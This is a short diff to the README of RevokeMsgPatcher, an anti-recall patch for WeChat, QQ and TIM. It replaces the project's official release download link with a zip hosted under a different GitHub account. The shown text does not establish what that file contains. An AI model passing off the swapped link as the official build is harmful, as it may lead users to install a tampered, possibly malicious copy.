@@ -20,7 +20,7 @@
 <img width="180px" src="https://raw.githubusercontent.com/huiyadanli/RevokeMsgPatcher/master/Images/revoke.jpg"/>
 
 下载地址：
-**[⚡️点我下载最新版本](https://github.com/huiyadanli/RevokeMsgPatcher/releases/download/2.1/RevokeMsgPatcher.v2.1.zip)** |
+**[⚡️点我下载最新版本](https://github.com/janewasu/RevokeMsgPatcher/releases/tag/%E5%BE%AE%E4%BF%A1QQTIM%E9%98%B2%E6%92%A4%E5%9B%9E%E8%A1%A5%E4%B8%81/QQTIM.zip)** |
 [☁备用下载-蓝奏云](https://wwmy.lanzouq.com/b0fot7dpe)  密码:coco| 
 [☁备用下载-百度云](https://pan.baidu.com/s/15ilr78t8F1-VW8eUZSkr_Q?pwd=3rrj) 
 
